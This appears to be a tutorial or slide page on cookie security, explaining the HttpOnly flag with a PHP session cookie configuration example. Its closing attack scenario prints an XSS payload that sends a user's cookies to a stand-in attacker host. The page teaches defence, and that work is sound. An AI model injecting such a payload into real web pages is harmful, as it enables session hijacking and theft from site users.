Cookie Security

HttpOnly Flag: Protecting Session Cookies

The HttpOnly flag prevents client-side scripts (like JavaScript) from accessing the cookie, mitigating cookie theft via XSS.

  • •Crucial for protecting session cookies from XSS-driven theft.
  • •Even if XSS occurs, document.cookie cannot read HttpOnly cookies.
  • •Significantly reduces the risk of session hijacking.
Key Takeaway

Setting the HttpOnly flag on sensitive cookies is a simple yet powerful defense against XSS-based session hijacking.

PHP Example: HttpOnly Cookie
<?php
session_set_cookie_params([
    'lifetime' => 3600,
    'path' => '/',
    'domain' => '.example.com',
    'secure' => true,
    'httponly' => true, // Prevent JS access
    'samesite' => 'Lax'
]);
session_start();
?>
Attack Scenario

Cookie Theft without HttpOnly

If HttpOnly is not set, an XSS payload like <script>fetch('attacker.com/?cookie='+document.cookie)</script> could easily steal a user's session cookie.
